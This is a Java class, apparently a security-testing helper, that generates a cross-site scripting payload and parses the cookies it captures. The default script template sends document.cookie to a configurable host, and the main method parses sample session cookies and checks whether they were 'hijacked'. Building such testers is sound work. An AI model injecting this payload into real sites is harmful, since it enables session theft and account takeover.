import org.apache.log4j.Logger;

import java.text.MessageFormat;
import java.util.*;

/**
 * Created by Ilya Evlampiev on 13.06.15.
 */
public class XSSCheck {
    private String host;
    private int port;
    private String resource;
    private String scriptTemplate = "<script> img = new Image(); img.src = \"http://%1$s:%2$d/%3$s?\"+document.cookie; </script>"; //generic template

    private static final Logger log = Logger.getLogger(XSSCheck.class);

    private boolean xssURLCalled = false;
    private boolean xssCookiePassed = false;
    private String xssCookieValue;
    private List<String> tokenizedCookies;
    private Map<String, String> cookiesAndValues = new HashMap<String, String>();

    XSSCheck(String host, int port, String resource) {
        this.host = host;
        this.port = port;
        this.resource = resource;
        log.info(MessageFormat.format(
                "New XSS check is created with  host {0}, port {1,number}, resource {2} and script template {3}", host, port, resource, scriptTemplate));
    }

    XSSCheck(String host, int port, String resource, String scriptTemplate) {
        this.host = host;
        this.port = port;
        this.resource = resource;
        this.scriptTemplate = scriptTemplate;
        log.info(MessageFormat.format(
                "New XSS check is created with  host {0}, port {1,number}, resource {2} and script template {3}", host, port, resource, scriptTemplate));
    }

    public String getXSS() {
        log.info("The XSS string is requested");
        return String.format(scriptTemplate, host, Integer.valueOf(port), resource);
    }

    public String getResource() {
        log.info("The XSS checker resource is requested");
        return this.resource;
    }

    public int getPort() {
        log.info("The XSS checker port is requested");
        return this.port;
    }

    public String getHost() {
        log.info("The XSS checker host is requested");
        return this.host;
    }

    public boolean getXSSCookiePassedStatus() {
        log.info("The XSS cookie passed status is requested");
        return this.xssCookiePassed;
    }

    public void setXSSCookiePassedStatus(boolean set) {
        log.info("The XSS cookie passed status is set to " + set);
        xssCookiePassed = set;
    }

    public boolean getXSSURLCalledStatus() {
        log.info("The XSS URL called status is requested");
        return this.xssURLCalled;
    }

    public void setXSSURLCalledStatus(boolean set) {
        log.info("The XSS URL called status is set to " + set);
        xssURLCalled = set;
    }

    public void setXSSCookiesValue(String cookieValue) {
        log.info("The XSS cookie value is set to " + cookieValue);
        xssCookieValue = cookieValue;
        log.info("The XSS cookie value is tokenized");
        tokenizedCookies = Arrays.asList(xssCookieValue.split(";%20"));

        for (String token : tokenizedCookies) {
            String[] cookieAndValue = token.split("=");
            if (cookieAndValue.length == 2) {
                cookiesAndValues.put(cookieAndValue[0], cookieAndValue[1]);
                log.info(MessageFormat.format(
                        "Cookie: {0}; value: {1}", cookieAndValue[0], cookieAndValue[1]));
            } else {
                log.error("Cookie " + token + " can not be splitted to cookie and value");
            }
        }
    }

    public String getXSSCookieValue(String cookie) {
        log.info("Value for `" + cookie + "` requested");
        if (cookiesAndValues.containsKey(cookie)) {
            String valueToReturn = cookiesAndValues.get(cookie);
            log.info("Value for `" + cookie + "` is: " + valueToReturn);
            return valueToReturn;
        } else {
            log.error("Cookie `" + cookie + "` is not obtained via XSS");
            return null;
        }
    }

    public boolean getXSSCookieHijacked(String cookie) {
        log.info("Hijack event for `" + cookie + "` requested");
        if (cookiesAndValues.containsKey(cookie)) {
            String valueToReturn = cookiesAndValues.get(cookie);
            log.info("Value for `" + cookie + "` is: " + valueToReturn);
            return true;
        } else {
            log.error("Cookie `" + cookie + "` is not obtained via XSS");
            return false;
        }
    }


    public static void main(String[] args) {
        XSSCheck x = new XSSCheck("localhost", 1123, "xss.gif");
        System.out.println(x.getXSS());
        x.setXSSCookiesValue("ui3=1429689085;%20wayback_server=1;%20visited=20150612;%20PHPSESSID=enrf51icap788bepa2688bs8h4;%20JSESSIONID=78FCA04398B47540F4792B2D723E920B");
        x.getXSSCookieValue("visited");
        x.getXSSCookieValue("visited2");
        x.getXSSCookieHijacked("visited");
        x.getXSSCookieHijacked("visited2");
    }

}
